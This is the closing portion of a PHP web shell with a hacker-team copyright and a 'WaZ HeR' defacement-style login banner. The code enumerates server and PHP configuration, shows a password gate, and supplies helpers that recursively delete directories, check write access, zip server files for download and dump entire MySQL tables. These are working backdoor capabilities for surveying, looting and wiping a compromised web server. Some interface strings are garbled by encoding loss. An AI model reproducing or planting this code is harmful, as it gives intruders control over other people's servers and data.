			1  => array("??? C??????","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
			2  => array("??? C??? E? ???????",gethostbyname($_SERVER['SERVER_NAME'])),
			3  => array("C????",PHP_OS),
			5  => array("C??UE",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
			6  => array("?UC? C??????",$_SERVER['SERVER_SOFTWARE']),
			7  => array("???? C??????",$_SERVER['SERVER_PORT']),
			8  => array("??? C??UC?",strtoupper(php_sapi_name())),
			9  => array("??IC? C??UC?",PHP_VERSION),
			10 => array("C???? C?A??",getphpcfg("safemode")),
			11 => array("????? C??I??",$adminmail),
			12 => array("???C? C?O?",__FILE__),

			13 => array("allow url fopen",getphpcfg("allow_url_fopen")),
			14 => array("enable dl",getphpcfg("enable_dl")),
			15 => array("display errors",getphpcfg("display_errors")),
			16 => array("register globals",getphpcfg("register_globals")),
			17 => array("magic quotes gpc",getphpcfg("magic_quotes_gpc")),
			18 => array("memory limit",getphpcfg("memory_limit")),
			19 => array("post max size",getphpcfg("post_max_size")),
			20 => array("upload max filesize",$upsize),
			21 => array("max execution time",getphpcfg("max_execution_time")."?ë"),
			22 => array("disable functions",$dis_func),
			23 => array("phpinfo()",$phpinfo),
			24 => array("diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),

			25 => array("GD Library",getfun("imageline")),
			26 => array("IMAP",getfun("imap_close")),
			27 => array("MySQL",getfun("mysql_close")),
			28 => array("SyBase",getfun("sybase_close")),
			29 => array("Oracle",getfun("ora_close")),
			30 => array("Oracle 8 ",getfun("OCILo???ff")),
			31 => array("PREL",getfun("preg_match")),
			32 => array("PDF",getfun("pdf_close")),
			33 => array("Postgre SQL",getfun("pg_close")),
			34 => array("SNMP",getfun("snmpget")),
			35 => array("(Zlib)",getfun("gzclose")),
			36 => array("XML",getfun("xml_set_object")),
			37 => array("FTP",getfun("ftp_login")),
			38 => array("ODBC",getfun("odbc_close")),
			39 => array("Session",getfun("session_start")),
			40 => array("Socket",getfun("fsockopen")),
		); 

	$tb->tableheader();
	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
	$tb->tdbody('<b></b>','left','1','30','style="padding-left: 5px;"');
	$tb->tdbody('C:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','???','','submit'),'left','2','30','style="padding-left: 5px;"');
	$tb->makehidden('do','viewphpvar');
	echo "</form>\n";
	$hp = array(0=> '·?I??÷???O', 1=> '?????CE ?? C??????', 2=> '');
	for ($a=0;$a<3;$a++) {
		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
?>
  <tr class="secondalt">
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?php
		if ($a==0) {
			for($i=0;$i<=12;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 1) {
			for ($i=13;$i<=24;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 2) {
			for ($i=25;$i<=40;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?>
      </table>
    </td>
  </tr>
<?php
	}//for
echo "</table>";
}//end phpenv
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
  <tr>
    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
  </tr>
</table>
</center>
</body>
</html>

<?php


	function loginpage() {
?>
<span style="font-size: 15px; font-family: Verdana">Hi plz reat the pass word to acsess </span>
<style type="text/css">
input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}
</style>
<form method="POST" action="">
<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
<input type="hidden" name="do" value="login">
<input type="submit" value="Login">
</form>
<span style="font-size: 15px; font-family: Verdana">MoSt3mR WaZ HeR </span>
<?php
		exit;
	}//end loginpage()

	
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		return (@rmdir($deldir)) ? 1 : 0;
	} 

	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return "No";
			break;
			case 1:
			return "Yes";
			break;
			default:
			return $result;
			break;
		}
	}

	function getfun($funName) {
		return (false !== function_exists($funName)) ? "Yes" : "No";
	}

	class PHPZip{
	var $out='';
		function PHPZip($dir)	{
    		if (@function_exists('gzcompress'))	{
				$curdir = getcwd();
				if (is_array($dir)) $filelist = $dir;
		        else{
			        $filelist=$this -> GetFileList($dir);//I?¼???±?
				    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
	            }
		        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
				else chdir($curdir);
				if (count($filelist)>0){
					foreach($filelist as $filename){
						if (is_file($filename)){
							$fd = fopen ($filename, "r");
							$content = @fread ($fd, filesize ($filename));
							fclose ($fd);
						    if (is_array($dir)) $filename = basename($filename);
							$this -> addFile($content, $filename);
						}
					}
					$this->out = $this -> file();
					chdir($curdir);
				}
				return 1;
			}
			else return 0;
		}

		function GetFileList($dir){
			static $a;
			if (is_dir($dir)) {
				if ($dh = opendir($dir)) {
			   		while (($file = readdir($dh)) !== false) {
						if($file!='.' && $file!='..'){
            				$f=$dir .'/'. $file;
            				if(is_dir($f)) $this->GetFileList($f);
							$a[]=$f;
	        			}
					}
     				closedir($dh);
    			}
			}
			return $a;
		}

		var $datasec      = array();
	    var $ctrl_dir     = array();
		var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	    var $old_offset   = 0;

		function unix2DosTime($unixtime = 0) {
	        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		    if ($timearray['year'] < 1980) {
				$timearray['year']    = 1980;
        		$timearray['mon']     = 1;
	        	$timearray['mday']    = 1;
		    	$timearray['hours']   = 0;
				$timearray['minutes'] = 0;
        		$timearray['seconds'] = 0;
	        } // end if
		    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
			        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	    }

		function addFile($data, $name, $time = 0) {
	        $name     = str_replace('\\', '/', $name);

		    $dtime    = dechex($this->unix2DosTime($time));
	        $hexdtime = '\x' . $dtime[6] . $dtime[7]
		              . '\x' . $dtime[4] . $dtime[5]
			          . '\x' . $dtime[2] . $dtime[3]
				      . '\x' . $dtime[0] . $dtime[1];
	        eval('$hexdtime = "' . $hexdtime . '";');
		    $fr   = "\x50\x4b\x03\x04";
			$fr   .= "\x14\x00";
	        $fr   .= "\x00\x00";
		    $fr   .= "\x08\x00";
			$fr   .= $hexdtime;

	        $unc_len = strlen($data);
		    $crc     = crc32($data);
			$zdata   = gzcompress($data);
	        $c_len   = strlen($zdata);
		    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
			$fr      .= pack('V', $crc);
	        $fr      .= pack('V', $c_len);
		    $fr      .= pack('V', $unc_len);
			$fr      .= pack('v', strlen($name));
	        $fr      .= pack('v', 0);
		    $fr      .= $name;

			$fr .= $zdata;

	        $fr .= pack('V', $crc);
		    $fr .= pack('V', $c_len);
			$fr .= pack('V', $unc_len);

	        $this -> datasec[] = $fr;
		    $new_offset        = strlen(implode('', $this->datasec));

			$cdrec = "\x50\x4b\x01\x02";
	        $cdrec .= "\x00\x00";
		    $cdrec .= "\x14\x00";
			$cdrec .= "\x00\x00";
	        $cdrec .= "\x08\x00";
		    $cdrec .= $hexdtime;
			$cdrec .= pack('V', $crc);
	        $cdrec .= pack('V', $c_len);
		    $cdrec .= pack('V', $unc_len);
			$cdrec .= pack('v', strlen($name) );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('v', 0 );
			$cdrec .= pack('v', 0 );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('V', 32 );
			$cdrec .= pack('V', $this -> old_offset );
	        $this -> old_offset = $new_offset;
		    $cdrec .= $name;

			$this -> ctrl_dir[] = $cdrec;
	    }

		function file() {
			$data    = implode('', $this -> datasec);
	        $ctrldir = implode('', $this -> ctrl_dir);
		    return
			    $data .
				$ctrldir .
	            $this -> eof_ctrl_dir .
		        pack('v', sizeof($this -> ctrl_dir)) .
			    pack('v', sizeof($this -> ctrl_dir)) .
				pack('V', strlen($ctrldir)) .
	            pack('V', strlen($data)) .
		        "\x00\x00";
	    }
	}

	function sqldumptable($table, $fp=0) {
		$tabledump = "DROP TABLE IF EXISTS $table;\n";
		$tabledump .= "CREATE TABLE $table (\n";

		$firstfield=1;

		$fields = mysql_query("SHOW FIELDS FROM $table");
		while ($field = mysql_fetch_array($fields)) {
			if (!$firstfield) {
				$tabledump .= ",\n";
			} else {
				$firstfield=0;
			}
			$tabledump .= "   $field[Field] $field[Type]";
			if (!empty($field["Default"])) {
				$tabledump .= " DEFAULT '$field[Default]'";
			}
			if ($field['Null'] != "YES") {
				$tabledump .= " NOT NULL";
			}
			if ($field['Extra'] != "") {
				$tabledump .= " $field[Extra]";
			}
		}
		mysql_free_result($fields);
	
		$keys = mysql_query("SHOW KEYS FROM $table");
		while ($key = mysql_fetch_array($keys)) {
			$kname=$key['Key_name'];
			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
				$kname="UNIQUE|$kname";
			}
			if(!is_array($index[$kname])) {
				$index[$kname] = array();
			}
			$index[$kname][] = $key['Column_name'];
		}
		mysql_free_result($keys);

		while(list($kname, $columns) = @each($index)) {
			$tabledump .= ",\n";
			$colnames=implode($columns,",");

			if ($kname == "PRIMARY") {
				$tabledump .= "   PRIMARY KEY ($colnames)";
			} else {
				if (substr($kname,0,6) == "UNIQUE") {
					$kname=substr($kname,7);
				}
				$tabledump .= "   KEY $kname ($colnames)";
			}
		}

		$tabledump .= "\n);\n\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}

		$rows = mysql_query("SELECT * FROM $table");
		$numfields = mysql_num_fields($rows);
		while ($row = mysql_fetch_array($rows)) {
			$tabledump = "INSERT INTO $table VALUES(";

			$fieldcounter=-1;
			$firstfield=1;
			while (++$fieldcounter<$numfields) {
				if (!$firstfield) {
					$tabledump.=", ";
				} else {
					$firstfield=0;
				}

				if (!isset($row[$fieldcounter])) {
					$tabledump .= "NULL";
				} else {
					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
				}
			}

			$tabledump .= ");\n";

			if ($fp) {
				fwrite($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		mysql_free_result($rows);
	}

	class FORMS {
		function tableheader() {
			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
		}

		function headerform($arg=array()) {
			global $dir;
			if ($arg[enctype]){
				$enctype="enctype=\"$arg[enctype]\"";
			} else {
				$enctype="";
			}
			if (!isset($arg[method])) {
				$arg[method] = "POST";
			}
			if (!isset($arg[action])) {
				$arg[action] = '';
			}
			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
			echo "  <tr>\n";
			echo "    <td>".$arg[content]."</td>\n";
			echo "  </tr>\n";
			echo "  </form>\n";
		}

		function tdheader($title) {
			global $dir;
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\"></b></td>\n";
			echo "  </tr>\n";
		}

		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
			if ($bgcolor=='2') {
				$css="secondalt";
			} elseif ($bgcolor=='1') {
				$css="firstalt";
			} else {
				$css=$bgcolor;
			}
			$height = empty($height) ? "" : " height=".$height;
			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
			echo "  <tr class=\"".$css."\">\n";
			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
			echo "  </tr>\n";
		}

		function tablefooter() {
			echo "</table>\n";
		}

		function formheader($action='',$title,$target='') {
			global $dir;
			$target = empty($target) ? "" : " target=\"".$target."\"";
			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">C????? ???C??E</a>]??</b></td>\n";
			echo "  </tr>\n";
		}

		function makehidden($name,$value=''){
			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
		}

		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
			return $input;
		}

		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
			return $textarea;
		}

		function formfooter($over='',$height=''){
			$height = empty($height) ? "" : " height=\"".$height."\"";
			echo "  <tr class=\"secondalt\">\n";
			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"???\"></td>\n";
			echo "  </tr>\n";
			echo " </form>\n";
			echo $end = empty($over) ? "" : "</table>\n";
		}

		function makeselect($arg = array()){
			if ($arg[multiple]==1) {
				$multiple = " multiple";
				if ($arg[size]>0) {
					$size = "size=$arg[size]";
				}
			}
			if ($arg[css]==0) {
				$css = "class=\"input\"";
			}
			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
				if (is_array($arg[option])) {
					foreach ($arg[option] AS $key=>$value) {
						if (!is_array($arg[selected])) {
							if ($arg[selected]==$key) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}

						} elseif (is_array($arg[selected])) {
							if ($arg[selected][$key]==1) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}
						}
					}
				}
			$select .= "</select>\n";
			return $select;
		}
	}
?>